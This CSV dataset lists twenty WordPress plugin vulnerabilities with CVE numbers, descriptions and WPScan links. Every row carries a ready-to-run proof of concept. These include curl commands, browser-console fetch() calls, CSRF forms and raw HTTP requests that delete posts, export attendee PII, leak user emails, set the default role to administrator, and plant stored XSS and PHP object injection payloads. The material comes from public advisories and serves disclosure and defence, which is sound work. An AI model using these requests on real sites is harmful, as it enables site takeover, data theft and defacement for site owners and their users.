id,plugin_name,vulnerable_version,vulnerability_name,description,cve,poc,url
1,activedemand,< 0.2.28,Unauthenticated Post Creation/Update/Deletion,"The plugin does not have any authorisation in some of its REST route, which could allow unauthenticated users to delete, create and update arbitrary post",CVE-2022-36296,"The following curl request will create a post draft whose title is 'hacked-title':

curl -X POST --url 'http://vulnerable-site.tld/wp-json/activedemand/v1/create-post?api_key=&slug=hacked-slug&title=hacked-title&content=hacked-content'",https://wpscan.com/vulnerability/d06a2db3-557b-4eae-ad80-85701cd40f3a/
2,rsvp,< 2.7.8,Unauthenticated Entries Export,"The plugin does not have any authorisation checks when exporting its entries, and has the export function hooked to the init action. As a result, unauthenticated attackers could call it and retrieve PII such as first name, last name and email address of users registered for events",CVE-2022-1054,"curl ""https://example.com/wp-admin/admin.php?page=rsvp-admin-export""

""First Name"",""Last Name"",""Email"",""RSVP Status"",""Kids Meal"",""Associated Attendees"",""Vegetarian"",""Note"",""Additional Attendee"",""pre-fill URL""
""test"",""test"",""secret@example.com"",""Yes"",""N"","""",""N"","""",""N"",""""",https://wpscan.com/vulnerability/95a5fad1-e823-4571-8640-19bf5436578d/
3,cp-multi-view-calendar,< 1.4.07,Unauthenticated Arbitrary Event Creation to Stored XSS,"The plugin does not have any authorisation and CSRF checks in place when creating an event, and is also lacking sanitisation as well as escaping in some of the event fields. This could allow unauthenticated attackers to create arbitrary events and put Cross-Site Scripting payloads in it.",CVE-2022-2846,"As an unauthenticated user, to add a malicious event (on October 6th, 2022) to the calendar with ID 1, open the code below

<html>
  <body>
    <form action=""https://example.com/?cpmvc_do_action=mvparse&f=datafeed&calid=1&month_index=0&method=adddetails"" method=""POST"">
      <input type=""hidden"" name=""Subject"" value='""><script>alert(/XSS/)</script>' />
      <input type=""hidden"" name=""colorvalue"" value=""#f00"" />
      <input type=""hidden"" name=""rrule"" value="""" />
      <input type=""hidden"" name=""rruleType"" value="""" />
      <input type=""hidden"" name=""stpartdate"" value=""10/6/2022"" />
      <input type=""hidden"" name=""stparttime"" value=""00:00"" />
      <input type=""hidden"" name=""etpartdate"" value=""10/6/2022"" />
      <input type=""hidden"" name=""etparttime"" value=""00:00"" />
      <input type=""hidden"" name=""stpartdatelast"" value=""10/6/2022"" />
      <input type=""hidden"" name=""etpartdatelast"" value=""10/6/2022"" />
      <input type=""hidden"" name=""stparttimelast"" value="""" />
      <input type=""hidden"" name=""etparttimelast"" value="""" />
      <input type=""hidden"" name=""IsAllDayEvent"" value=""1"" />
      <input type=""hidden"" name=""Location"" value=""CSRF"" />
      <input type=""hidden"" name=""Description"" value='<p style=""text-align: left;"">CSRF</p>' />
      <input type=""hidden"" name=""timezone"" value=""4.5"" />
      <input type=""submit"" value=""Submit request"" />
    </form>
  </body>
</html>

The XSS will be triggered when viewing the related event",https://wpscan.com/vulnerability/95f92062-08ce-478a-a2bc-6d026adf657c/
4,popup-manager,<= 1.6.6,Unauthenticated Arbitrary Popup Deletion,"The plugin does not have authorisation and CSRF checks when deleting popups, which could allow unauthenticated users to delete them",CVE-2022-4124,"As an unauthenticated users, or via CSRF:

fetch('/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=pm_delete_popup&popup_id=2',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/60786bf8-c0d7-4d80-b189-866aba79bce2/
5,smart-forms,< 2.6.71,Subscriber+ Form Data Download,"The plugin does not have authorisation in its rednao_smart_forms_entries_list AJAX action, allowing any authenticated users, such as subscriber, to download arbitrary form's data, which could include sensitive information such as PII depending on the form.",CVE-2022-0163,"Execute the below command in the web developer console of the browser when being logged in as a subscriber:

fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": new URLSearchParams({""action"":""rednao_smart_forms_entries_list"",""data"":'{""Form"":""1""}'}),
  ""method"": ""POST"",
  ""credentials"": ""include""
})
  .then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/2b6b0731-4515-498a-82bd-d416f5885268/
6,all-in-one-wp-migration-box-extension,< 1.54,Unauthenticated Access Token Update,"The plugins do not have authorisation in the init() function hooked to the admin_init action, allowing unauthenticated attackers to update the access token",CVE-2023-40004,"With the All-in-One WP Migration Box Extension installed, open the below URL as unauthenticated:

https://example.com/wp-admin/admin-ajax.php?ai1wmbe_token=AAAA",https://wpscan.com/vulnerability/637bbd1d-2bf2-470e-8d19-bd48a2280530/
7,coming-soon,< 6.15.22,Unauthenticated Plugin Page Content Update,"The plugin does not have authorisation in its seedprod_lite_new_lpage function, allowing unauthenticated attackers to update the contents of coming-soon, maintenance pages, login and 404 pages set up with the plugin to a blank state",CVE-2024-1072,"As unauthenticated, open the following URL to put the Maintenance Mode page as blank: https://example.com/wp-admin/admin-post.php?page=seedprod_lite_template&id=0&type=mm

To update other page, change the type parameter accordingly:
- cs for Coming Soon
- mm for Maintenance Mode
- p404 for 404
- loginp for Login Page",https://wpscan.com/vulnerability/19eb822d-84f3-48f2-ba1a-dbeaac64fb44/
8,eventON,< 2.2.8,Unauthenticated Arbitrary Post Metadata Update,"The plugins do not have authorisation in an AJAX action, and does not ensure that the post to be updated belong to the plugin, allowing unauthenticated users to update arbitrary post metadata.",CVE-2024-0238,"To set the Meeting URL to https://attacker.com/ on the Virtual Event with ID 240:

curl -X POST --data ""eid=240&values[_vir_url]=https://attacker.com/"" 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'

To set the my_meta metadata (if it does not exist, it will be created as a custom field) to attacker on the post with ID 20:

curl -X POST --data ""eid=20&values[my_meta]=attacker"" 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'

This can lead to Stored XSS in Free < 2.7.7 and Premium <= 4.5.4

curl -X POST --data 'eid=240&values[_evcal_ec_f1a1_cus]="" style=animation-name:rotation onanimationstart=alert(/XSS/)//' 'https://example.com/wp-admin/admin-ajax.php?action=eventon_eventpost_update_meta'

The XSS will be triggered when an admin will edit the event in the backend",https://wpscan.com/vulnerability/774655ac-b201-4d9f-8790-9eff8564bc91/
9,mstore-api,< 3.9.7,Subscriber+ Unauthorized Settings Update,"The plugin does not secure most of its AJAX actions by implementing privilege checks, nonce checks, or a combination of both.",CVE-2023-3131,"Make sure the site also has WooCommerce installed and activated, then, while logged-in as a subscriber, visit the following URLs:

- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_limit_product&limit=99
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_firebase_server_key&serverKey=hacked
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_new_order_title&title=1337
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_new_order_message&message=hacked+message
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_status_order_title&title=1338
- http://TARGET-SERVER/wp-admin/admin-ajax.php?action=mstore_update_status_order_message&message=hacked+message

Then, while logged-in as an administrator, visit /wp-admin/admin.php?page=mstore-plugin, and notice how the attacks have changed all the values.",https://wpscan.com/vulnerability/970735f1-24bb-441c-89b6-5a0959246d6c/
10,donation-button,<= 4.0.0,Subscriber+ Broken Access Control leading to SMS Spam,"The plugin does not properly check for privileges and nonce tokens in its ""donation_button_twilio_send_test_sms"" AJAX action, which may allow any users with an account on the affected site, like subscribers, to use the plugin's Twilio integration to send SMSes to arbitrary phone numbers.",CVE-2022-4004,"While logged onto the site as a subscriber, paste the following in your browser's console:

fetch('http://localhost/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=donation_button_twilio_send_test_sms&donation_button_twilio_sms_test_mobile_number=+36205551122&donation_button_twilio_sms_test_message=TEXT'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/6a3bcfb3-3ede-459d-969f-b7b30dafd098/
11,gmap-embed,< 1.8.1,Subscriber+ Arbitrary Post Deletion and Plugin's Settings Update,"The plugin does not have proper authorisation and CSRF in most of its AJAX actions, which could allow any authenticated users, such as subscriber to delete arbitrary posts and update the plugin's settings.",CVE-2021-25011,"Removing post:

fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": ""action=wpgmapembed_remove_wpgmap&post_id=1"",
  ""method"": ""POST"",
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));

Updating settings:

fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""body"": ""action=wpgmapembed_save_setup_wizard&wgm_api_key=hohohoho&wgm_language=999&wgm_regional_area=aaaaa"",
  ""method"": ""POST"",
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/6639da0d-6d29-46c1-a3cc-5e5626305833/
12,eventON,< 2.2.8,Unauthenticated Email Address Disclosure,"The plugins do not have authorisation in an AJAX action, allowing unauthenticated users to retrieve email addresses of any users on the blog",CVE-2024-0235,"To get the administrator user emails:

curl -X POST --data '_user_role=administrator' 'https://example.com/wp-admin/admin-ajax.php?action=eventon_get_virtual_users'

To get the subscriber user emails:

curl -X POST --data '_user_role=subscriber' 'https://example.com/wp-admin/admin-ajax.php?action=eventon_get_virtual_users'

etc to get others",https://wpscan.com/vulnerability/e370b99a-f485-42bd-96a3-60432a15a4e9/
13,wp-hide,<= 0.0.2,Unauthenticated Settings Update,"The plugin does not have authorisation and CSRF checks in place when updating the custom_wpadmin_slug settings, allowing unauthenticated attackers to update it with a crafted request",CVE-2022-3489,"curl -X POST --data ""custom_wpadmin_slug=attacker-value"" https://example.com/wp-admin/admin-post.php

Settings is displayed in Settings > Permalinks",https://wpscan.com/vulnerability/36d78b6c-0da5-44f8-b7b3-eae78edac505/
14,intuitive-custom-post-order,< 3.1.4,Subscriber+ Arbitrary Menu Order Update,"The plugin does not check for authorization in the update-menu-order ajax action, allowing any logged in user (with roles as low as Subscriber) to update the menu order",CVE-2022-4385,"Open the below HTML while being logged in as a subscriber

<html> <body> <form action=""https://example.com/wp-admin/admin-ajax.php"" method=""POST""> <input type=""hidden"" name=""action"" value=""update-menu-order"" /> <input type=""hidden"" name=""order"" value=""post[]=7&post[]=5"" /> <input type=""submit"" value=""Submit request"" /> </form> </body> </html>",https://wpscan.com/vulnerability/8f900d37-6eee-4434-8b9b-d10cc4a9167c/
15,capability-manager-enhanced,< 2.3.1,Unauthenticated Arbitrary Options Update to Blog Compromise,"The plugin does not have authorisation and CSRF checks when updating the plugin's settings via the init hook, and does not ensure that the options to be updated belong to the plugin. As a result, unauthenticated attackers could update arbitrary blog options, such as the default role and make any new registered user with an administrator role.",CVE-2021-25032,"POST /wp-admin/admin.php HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 81
Connection: close

page=pp-capabilities-settings&all_options=default_role&default_role=administrator",https://wpscan.com/vulnerability/2f0f1a32-0c7a-48e6-8617-e0b2dcf62727/
16,osmapper,<= 2.1.5,Unauthenticated Arbitrary Post Deletion,"The plugin contains an AJAX action to delete a plugin related post type named 'map' and is registered with the wp_ajax_nopriv prefix, making it available to unauthenticated users. There is no authorisation, CSRF and checks in place to ensure that the post to delete is a map one. As a result, unauthenticated user can delete arbitrary posts from the blog",CVE-2021-24978,"POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1

action=ba_map_ajax_handler&requestType=delete_map&requestParams=<a post id>",https://wpscan.com/vulnerability/f0f2af29-e21e-4d16-9424-1a49bff7fb86/
17,zoho-crm-forms,< 1.7.6.2,Subscriber+ Arbitrary Options Update,"The plugin does not have authorisation and CSRF in some AJAX actions, and does not ensure that the option to be updated belong to the plugin. As a result, any authenticated users, such as subscriber could update arbitrary blog options (such as default_role and users_can_register).",CVE-2022-41978,"v < 1.7.6.1

https://example.com/wp-admin/admin-ajax.php?action=zcf_save_contact_form_title&nonce=&tp_title_key=blogname&tp_title_val=Changed%20by%20Subscriber

https://example.com/wp-admin/admin-ajax.php?action= mainActionscrmForms&operation=NoFieldOperation&doaction=SaveFormSettings&shortcode=blogname&thirdparty_title=Owned

v <= 1.7.6.1

Run one of the below command in the developer console of the web browser while being on the blog as a subscriber user and one of the backend page (such as the profile)

fetch(""/wp-admin/admin-ajax.php?action=zcf_save_contact_form_title&nonce="", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
    ""X-CSRF-TOKEN"": jQuery(""[name='zoho_crm_forms_csrf_token']"").attr(""content"")
  },
  ""method"": ""POST"",
  ""body"": 'tp_title_key=blogname&tp_title_val=Changed%20by%20Subscriber',
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));

fetch(""/wp-admin/admin-ajax.php?action=mainActionscrmForms&operation=NoFieldOperation&doaction=SaveFormSettings"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
    ""X-CSRF-TOKEN"": jQuery(""[name='zoho_crm_forms_csrf_token']"").attr(""content"")
  },
  ""method"": ""POST"",
  ""body"": 'shortcode=blogname&thirdparty_title=Owned',
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/e4102b5d-079a-4a3a-af2a-c2f712ac1cd7/
18,wp-hotel-booking,< 2.0.8,Subscriber+ Arbitrary Post Deletion,"The plugin does not have authorisation and CSRF checks, as well as does not ensure that the package to be deleted is a package, allowing any authenticated users, such as subscriber to delete arbitrary posts",CVE-2023-5651,"Run the below command in the developer console of the web browser while being on the blog as a subscriber user. This will put the post with ID 1 in the trash. Run it again to then delete the post

fetch(""/wp-admin/admin-ajax.php"", {""headers"": {""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8""},""body"": 'action=tp_extra_package_remove&package_id=1',""method"": ""POST""});",https://wpscan.com/vulnerability/a365c050-96ae-4266-aa87-850ee259ee2c/
19,insight-core,<= 1.0,Subscriber+ PHP Object Injection & Stored XSS,"The plugin does not have any authorisation and CSRF checks in the insight_customizer_options_import (available to any authenticated user), does not validate user input before passing it to unserialize(), nor sanitise and escape it before outputting it in the response. As a result, it could allow users with a role as low as Subscriber to perform PHP Object Injection, as well as Stored Cross-Site Scripting attacks",CVE-2021-24950,"let formData = new FormData;
formData.append('import-file', new Blob(['a:1:{s:16:""background_color"";s:34:""</style><script>alert(/XSS/);</script>"";}']))
formData.append('action', 'insight_customizer_options_import');
fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""body"": formData,
  ""method"": ""POST""
})
  .then(response => response.text())
  .then(data => console.log(data));

POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------189498983625966260651015514771
Content-Length: 458
Connection: close
Cookie: [any authenticated user]

-----------------------------189498983625966260651015514771
Content-Disposition: form-data; name=""import-file""; filename=""blob""
Content-Type: application/octet-stream

a:1:{s:16:""background_color"";s:34:""</style><script>alert(/XSS/);</script>"";}
-----------------------------189498983625966260651015514771
Content-Disposition: form-data; name=""action""

insight_customizer_options_import
-----------------------------189498983625966260651015514771--


The XSS will be triggered in all frontend pages",https://wpscan.com/vulnerability/01d430ea-ef85-4529-9ae4-c1f70016bb75/
20,profile-builder,< 3.9.8,Unauthenticated Plugin's Pages Creation,"The plugin lacks authorisation and CSRF in its page creation function which allows unauthenticated users to create the register, log-in and edit-profile pages from the plugin on the blog",CVE-2023-4059,"1. Access the URL: https://example.com/wp-admin/admin-post.php?page=profile-builder-basic-info&wppb_create_pages=true&wppb_force_create_pages=true 
2. As a logged in user, see that the pages `/register`, `/log-in`, and `/edit-profile` have been created.",https://wpscan.com/vulnerability/fc719d12-2f58-4d1f-b696-0f937e706842/
